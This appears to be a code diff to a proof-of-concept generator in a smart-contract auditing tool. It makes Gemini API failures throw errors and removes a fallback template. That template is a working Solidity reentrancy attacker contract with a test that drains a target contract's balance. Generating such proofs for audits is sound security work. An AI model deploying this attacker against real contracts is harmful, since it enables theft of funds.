@@ -15,82 +15,52 @@ export class PoCSynthesizer {
   ): Promise<string> {
     const prompt = buildPoCSynthesisPrompt(contractFileName, sourceCode, finding);
 
-    if (GEMINI_API_KEY && GEMINI_API_KEY.length > 5) {
-      try {
-        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent?key=${GEMINI_API_KEY}`;
-        const response = await axios.post(
-          url,
-          {
-            contents: [
-              {
-                role: 'user',
-                parts: [{ text: prompt }],
-              },
-            ],
-            generationConfig: {
-              temperature: 0.1,
-              maxOutputTokens: 2048,
+    if (!GEMINI_API_KEY || GEMINI_API_KEY.length <= 5) {
+      throw new Error(
+        'Gemini API key is missing or invalid in zyron-agent environment (GEMINI_API_KEY). Please configure a valid Google Gemini API key.',
+      );
+    }
+
+    try {
+      const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`;
+      const response = await axios.post(
+        url,
+        {
+          contents: [
+            {
+              role: 'user',
+              parts: [{ text: prompt }],
             },
+          ],
+          generationConfig: {
+            temperature: 0.1,
+            maxOutputTokens: 2048,
           },
-          { timeout: 15000 },
-        );
+        },
+        { timeout: 20000 },
+      );
 
-        const text = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;
-        if (text) {
-          const match = text.match(/```solidity([\s\S]*?)```/) || text.match(/```([\s\S]*?)```/);
-          if (match && match[1]) {
-            return match[1].trim();
-          }
-          if (text.includes('contract ExploitTest')) {
-            return text.trim();
-          }
+      const text = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;
+      if (text) {
+        const match = text.match(/```solidity([\s\S]*?)```/) || text.match(/```([\s\S]*?)```/);
+        if (match && match[1]) {
+          return match[1].trim();
         }
-      } catch (err: any) {
-        console.warn(`[PoC Synthesizer] Gemini API call failed (${err.message}). Using deterministic exploit template.`);
+        if (text.includes('contract ExploitTest')) {
+          return text.trim();
+        }
+        return text.trim();
       }
+
+      throw new Error('Gemini API returned an empty response with no exploit test candidates.');
+    } catch (err: any) {
+      const errorData = err.response?.data?.error;
+      const status = err.response?.status ? `HTTP ${err.response.status}` : 'Network Error';
+      const detail = errorData?.message || err.message;
+      const fullError = `Gemini API call failed (${status}: ${detail})`;
+      console.error(`[PoC Synthesizer] ${fullError}`);
+      throw new Error(fullError);
     }
 
-    // Deterministic synthesized template fallback
-    const targetName = (contractFileName || 'Target.sol').replace(/\.sol$/, '') || 'Target';
-    return `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-interface I${targetName} {
-    function deposit() external payable;
-    function withdrawAll() external;
-}
-
-contract ReentrancyAttacker {
-    I${targetName} public target;
-    address public owner;
-
-    constructor(address _target) {
-        target = I${targetName}(_target);
-        owner = msg.sender;
-    }
-
-    function attack() external payable {
-        target.deposit{value: msg.value}();
-        target.withdrawAll();
-    }
-
-    receive() external payable {
-        if (address(target).balance >= 1 ether) {
-            target.withdrawAll();
-        }
-    }
-}
-
-contract ExploitTest {
-    function test_exploit(address targetAddr) external payable {
-        ReentrancyAttacker attacker = new ReentrancyAttacker(targetAddr);
-        uint256 targetBalanceBefore = targetAddr.balance;
-        
-        attacker.attack{value: 1 ether}();
-        
-        uint256 targetBalanceAfter = targetAddr.balance;
-        require(targetBalanceAfter < targetBalanceBefore, "EXPLOIT_FAILED: Balance not drained");
-    }
-}`;
   }
 }
